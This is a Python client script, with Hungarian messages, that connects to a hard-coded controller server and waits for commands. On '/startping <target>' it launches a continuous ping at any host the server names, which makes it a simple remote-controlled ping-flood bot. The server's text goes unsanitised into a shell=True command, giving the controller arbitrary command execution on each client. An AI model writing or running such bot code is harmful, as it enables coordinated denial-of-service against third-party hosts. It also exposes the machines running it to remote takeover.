import socket
import select
import time
import os
import sys

HOST = '192.168.1.3'
PORT = 8000

ACK_TEXT = 'text_received'

def main():
    # instantiate a socket object
    os.system('cls||clear')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('socket instantiated')

    # connect the socket
    connectionSuccessful = False
    while not connectionSuccessful:
        time.sleep(3)
        try:
            sock.connect((HOST, PORT))
            connectionSuccessful = True
            print("connected")
            
        except:
            pass
        # end try
    # end while

    socks = [sock]
    while True:
        readySocks, _, _ = select.select(socks, [], [], 5)
        for sock in readySocks:
            message = receiveTextViaSocket(sock)
            print('SERVER: ' + str(message))
        # end for
    # end while
# end function

def receiveTextViaSocket(sock):
    # get the text via the scoket

    encodedMessage = sock.recv(1024)
    if not encodedMessage :
        print ('\33[31m\33[1m \rDISCONNECTED!!\n \33[0m')
        sys.exit()
    else :
        message = encodedMessage.decode('utf-8')

    if (message.startswith("/startping")):
        target = message.replace("/startping ", "")
        import subprocess
        result = []
        win_cmd = "ping " + target + " -t"
        process = subprocess.Popen(win_cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE )
        for line in process.stdout:
            print (line)
            if message == "/quit":
                print (line)
                print("Leállítva!")
                process.terminate()
            result.append(line)
        errcode = process.returncode
        for line in result:
            print (line)

    elif message.startswith("/ban"):
        reason = message.replace("/ban ", "")
        os.system('cls||clear')
        print("Kibannoltak!")
        print ("Indok: " + reason)
        sock.close()
        print()
        input("Nyomj meg egy gombot a bezáráshoz!\n")
        quit()
                
    
    # now time to send the acknowledgement
    # encode the acknowledgement text
    encodedAckText = bytes(ACK_TEXT, 'utf-8')
    # send the encoded acknowledgement text
    sock.sendall(encodedAckText)

    return message
# end function

if __name__ == '__main__':
    main()





